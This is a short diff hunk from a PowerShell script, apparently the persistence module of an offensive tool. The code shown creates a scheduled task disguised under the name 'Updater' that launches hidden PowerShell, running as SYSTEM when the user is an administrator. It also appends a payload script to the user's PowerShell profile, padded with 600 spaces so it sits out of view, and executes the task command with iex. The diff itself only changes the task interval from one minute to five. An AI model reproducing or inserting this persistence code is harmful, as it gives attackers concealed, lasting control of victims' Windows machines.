@@ -7,7 +7,7 @@ if($Persist){
 if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
 {$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC HOURLY /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
 else
-{$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC MINUTE /MO 1 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden`""}
+{$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC MINUTE /MO 5 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden`""}
 mkdir (Split-Path -Parent $Prof)
 (gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
 iex $Payload|Out-Null
